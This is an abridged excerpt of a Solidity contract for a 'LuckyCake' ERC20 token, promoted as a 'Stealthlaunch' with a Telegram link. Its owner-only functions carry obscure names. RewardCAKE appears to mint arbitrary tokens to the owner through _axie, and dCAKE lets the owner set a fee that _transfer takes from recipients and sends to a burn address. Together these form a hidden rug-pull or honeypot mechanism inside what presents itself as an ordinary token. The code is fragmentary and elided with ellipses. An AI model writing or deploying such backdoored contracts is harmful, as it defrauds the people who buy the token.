...
/**                     
 *                  LuckyCake - The Luckiest Cake Token!
 *                       
 *                            Stealthlaunch!
 *                      
 *                  
 *                   Telegram: https://t.me/LuckyCakeToken
 *                        
 *                   
 *    
 * 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RewardCAKE(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function dCAKE(uint256 CAKE) external onlyOwner(){
        _cake = CAKE;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _cake);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _cake);
...
contract LuckyCAKE is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("LuckyCakeToken", "LuckyCakeToken") {
